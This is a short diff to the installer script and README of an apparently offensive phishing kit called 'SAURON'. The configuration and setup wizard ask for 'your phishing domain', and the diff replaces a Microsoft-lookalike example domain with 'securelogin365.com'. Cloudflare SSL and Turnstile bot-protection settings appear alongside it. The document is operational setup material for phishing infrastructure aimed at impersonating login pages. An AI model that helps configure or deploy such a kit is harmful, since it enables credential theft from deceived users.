@@ -250,7 +250,7 @@ cat > "$BUILD_DIR/.env.example" << 'ENV_EOF'
 # Copy this to .env and fill in your values
 
 # Your phishing domain (must be registered and point to this server)
-SAURON_DOMAIN=microsoftlogin365.com
+SAURON_DOMAIN=securelogin365.com
 
 # Cloudflare API token for automatic SSL certificates
 CLOUDFLARE_API_TOKEN=your_cloudflare_api_token_here
@@ -360,7 +360,7 @@ The `install-production.sh` script is **fully automated** and handles:
 
 The installer includes an **interactive setup wizard** that asks you:
 
-1. **Your phishing domain** (e.g., `microsoftlogin365.com`)
+1. **Your phishing domain** (e.g., `securelogin365.com`)
 2. **Cloudflare API token** (we'll show you how to get it)
 3. **Turnstile settings** (optional, for bot protection)
 
